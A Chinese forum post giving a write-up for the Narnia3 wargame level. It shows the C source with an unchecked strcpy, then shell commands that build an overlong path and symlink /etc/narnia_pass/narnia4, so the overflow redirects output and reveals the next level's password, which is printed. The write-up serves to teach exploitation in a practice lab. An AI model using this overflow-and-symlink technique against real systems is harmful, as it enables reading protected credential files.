
# [原创]WarGame-narnia3 解题思路

## Narnia3源码如下

```c
/*

   This program is free software; you can redistribute it and/or modify

   it under the terms of the GNU General Public License as published by

   the Free Software Foundation; either version 2 of the License, or

   (at your option) any later version.



   This program is distributed in the hope that it will be useful,

   but WITHOUT ANY WARRANTY; without even the implied warranty of

   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the

   GNU General Public License for more details.



   You should have received a copy of the GNU General Public License

   along with this program; if not, write to the Free Software

   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
```

## 溢出原理与操作

同样的是在`strcpy`时没有检查长度，从而导致的溢出，这里的题目精妙之处在于`ofile`比`ifile`先声明，所以`ifile`溢出以后存储的位置是在`ofile`中，将`ofile`原来的`/dev/null`覆盖了，从而能获取到下一个级别的密码，操作如下

```
narnia3@narnia:/$ mkdir -p /tmp/puregavin/aaaaaaaaaaaaaaaaa/tmp/puregavin
narnia3@narnia:/$ touch /tmp/puregavin/pass
narnia3@narnia:/$ ln -s /etc/narnia_pass/narnia4 /tmp/puregavin/aaaaaaaaaaaaaaaaa/tmp/puregavin/pass
narnia3@narnia:/tmp/puregavin$ chmod 666 pass
narnia3@narnia:/tmp/puregavin$ ls -al
total 308
drwxr-sr-x    3 narnia3 root   4096 Jul 26 05:36 .
drwxrws-wt 6860 root    root 303104 Jul 26 05:40 ..
drwxr-sr-x    3 narnia3 root   4096 Jul 26 05:36 aaaaaaaaaaaaaaaaa
-rw-rw-rw-    1 narnia3 root      0 Jul 26 05:36 pass
```

`ifile`声明是申请的空间是32字节，所以在正常目录`/tmp/puregavin/pass`之前必须有32个字节的长度，但是注意，整个目录必须是确实存在的，不然会打不开文件，之后要在正常目录中申请一个`pass`文件，用于接收密码，注意`pass`文件的权限，不然也会发生程序无法访问的问题；这里普及一下，[ln –s命令](https://bbs.kanxue.com/elink@256K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8X3y4C8x3K6t1H3y4#2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3z5e0l9H3y4e0l9H3x3e0t1`.)是创建软链接，Linux中软连接就像是Windows中的快捷方式，这种软链接可以跨系统操作，即使当前系统并没有指定文件，移到别的有指定文件的系统中也可以使用；利用构造的目录当做参数来执行`narnia3`程序，结果如下

```
narnia3@narnia:/narnia$ ./narnia3 /tmp/puregavin/aaaaaaaaaaaaaaaaa/tmp/puregavin/pass
copied contents of /tmp/puregavin/aaaaaaaaaaaaaaaaa/tmp/puregavin/p to a safer place... (/tmp/puregavin/p)
narnia3@narnia:/narnia$ cat /tmp/puregavin/pass
thaenohtai
```

## 小结

没啥好说的，附件是可执行文件和源码

[教程链接](https://bbs.kanxue.com/elink@5feK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2D9N6h3E0W2j5h3c8V1K9i4y4G2L8W2)9J5k6h3y4G2i4K6u0W2N6h3E0Q4x3V1k6T1L8r3!0Y4i4K6u0r3L8X3q4J5L8X3W2S2i4K6u0V1L8r3g2$3k6h3I4Q4x3X3b7K6i4K6u0r3)

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2019-7-26 14:21

被pureGavin编辑，原因：

上传的附件：

- [narnia3.c](javascript:void(0);)
  （1.66kb，3次下载）
- [narnia3](javascript:void(0);)
  （5.54kb，4次下载）
